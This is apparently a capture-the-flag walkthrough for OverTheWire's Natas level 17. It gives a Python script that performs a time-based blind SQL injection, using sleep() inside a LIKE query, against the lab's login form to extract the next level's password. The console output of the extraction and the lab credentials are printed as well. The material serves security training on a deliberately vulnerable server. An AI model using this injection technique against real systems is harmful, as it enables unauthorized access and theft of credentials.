`Link:` `https://overthewire.org/wargames/natas/natas17.html`
## [𝐖𝐚𝐥𝐤𝐭𝐡𝐫𝐨𝐮𝐠𝐡] ~ 𝐍𝐚𝐭𝐚𝐬 𝐋𝐞𝐯𝐞𝐥 𝟏𝟔 - 𝐋𝐞𝐯𝐞𝐥 𝟏𝟕

## 𝐆𝐢𝐯𝐞𝐧

- Username: natas17
- URL:      `http://natas17.natas.labs.overthewire.org`

## 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧

```
import requests  
from requests.auth import HTTPBasicAuth  
  
Auth=HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')  
headers = {'content-type': 'application/x-www-form-urlencoded'}  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
  
for char in allchars:  
        payload = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%283%29+%23'.format(char)  
        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
        if(r.elapsed.seconds >= 3):  
                filteredchars = filteredchars + char  
                print(filteredchars)  
  
print(filteredchars)  
  
for i in range(0,32):  
        for char in filteredchars:  
                payload = 'username=natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(3)%23'.format(passwd + char)  
                r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)  
                if(r.elapsed.seconds >= 3):  
                        passwd = passwd + char  
                        print(passwd)  
                        break  
                                   
```

```
                                                                                                                 
┌──(shreyas㉿kali)-[~/scripts]
└─$ python3 natas17.py
d
dg
dgh
dghj
dghjl
dghjlm
dghjlmp
dghjlmpq
dghjlmpqs
dghjlmpqsv
dghjlmpqsvw
dghjlmpqsvwx
dghjlmpqsvwxy
dghjlmpqsvwxyC
dghjlmpqsvwxyCD
dghjlmpqsvwxyCDF
dghjlmpqsvwxyCDFI
dghjlmpqsvwxyCDFIK
dghjlmpqsvwxyCDFIKO
dghjlmpqsvwxyCDFIKOP
dghjlmpqsvwxyCDFIKOPR
dghjlmpqsvwxyCDFIKOPR4
dghjlmpqsvwxyCDFIKOPR47
dghjlmpqsvwxyCDFIKOPR470
dghjlmpqsvwxyCDFIKOPR470
x
xv
xvK
xvKI
xvKIq
xvKIqD
xvKIqDj
xvKIqDjy
xvKIqDjy4
xvKIqDjy4O
xvKIqDjy4OP
xvKIqDjy4OPv
xvKIqDjy4OPv7
xvKIqDjy4OPv7w
xvKIqDjy4OPv7wC
xvKIqDjy4OPv7wCR
xvKIqDjy4OPv7wCRg
xvKIqDjy4OPv7wCRgD
xvKIqDjy4OPv7wCRgDl
xvKIqDjy4OPv7wCRgDlm
xvKIqDjy4OPv7wCRgDlmj
xvKIqDjy4OPv7wCRgDlmj0
xvKIqDjy4OPv7wCRgDlmj0p
xvKIqDjy4OPv7wCRgDlmj0pF
xvKIqDjy4OPv7wCRgDlmj0pFs
xvKIqDjy4OPv7wCRgDlmj0pFsC
xvKIqDjy4OPv7wCRgDlmj0pFsCs
xvKIqDjy4OPv7wCRgDlmj0pFsCsD
xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

```

## 𝐋𝐞𝐚𝐫𝐧𝐢𝐧𝐠

- Walkthrough: `https://www.abatchy.com/2016/12/natas-level-17`
- Post request: `https://stackoverflow.com/questions/43252542/how-to-measure-server-response-time-for-python-requests-post-request`
- Headers in request module python: `https://stackoverflow.com/questions/6260457/using-headers-with-the-python-requests-librarys-get-method`
- Blind SQL Detection cheatsheet: `https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1`
- SQL Injection Cheatsheet: `https://github.com/payloadbox/sql-injection-payload-list`
